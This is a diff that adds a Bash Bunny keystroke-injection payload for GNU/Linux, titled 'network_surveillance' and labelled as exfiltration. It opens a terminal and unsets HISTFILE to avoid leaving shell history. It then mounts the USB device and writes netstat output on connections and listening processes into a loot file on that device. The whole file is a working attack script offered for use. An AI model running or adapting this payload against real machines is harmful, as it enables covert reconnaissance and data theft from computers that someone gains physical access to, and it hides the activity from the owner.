@@ -1,0 +1,46 @@
+# Title: network_surveillance
+# Description: network_surveillance payload exfiltrates network connections, routing tables, interface statistics, masquerade connections, and multicast memberships.
+# AUTHOR: drapl0n
+# Version: 1.0
+# Category: Exfiltration.
+# Target: GNU/Linux.
+# Attackmodes: HID, Storage.
+
+LED SETUP
+ATTACKMODE STORAGE HID
+GET SWITCH_POSITION
+LED ATTACK
+Q DELAY 1000
+Q CTRL-ALT t
+Q DELAY 1000
+
+# [Prevent storing history]
+Q STRING unset HISTFILE
+Q ENTER
+Q DELAY 200
+
+# [Fetching BashBunny's block device]
+Q STRING disk='$(lsblk -fs | grep BashBunny | awk '\'{print\ '$1'}\'\)''
+Q ENTER
+Q DELAY 200
+
+# [Mounting BashBunny]
+Q STRING udisksctl mount -b /dev/'$disk'
+Q ENTER
+Q DELAY 2000
+Q STRING lmnt='$(lsblk | grep $disk | awk '\'{print\ '$7'}\'\)''
+Q ENTER
+Q DELAY 500
+
+# [Looting]
+Q STRING netstat -antup \>\> '$lmnt/loot/$(whoami)-network_surveillance' \&\& netstat -nlp \>\> '$lmnt/loot/$(whoami)-network_surveillance'
+Q ENTER
+Q DELAY 1000
+
+# [Unmounting BashBunny]
+Q STRING udisksctl unmount -b /dev/'$disk'
+Q ENTER
+Q DELAY 500
+Q STRING exit
+Q ENTER 
+LED FINISH
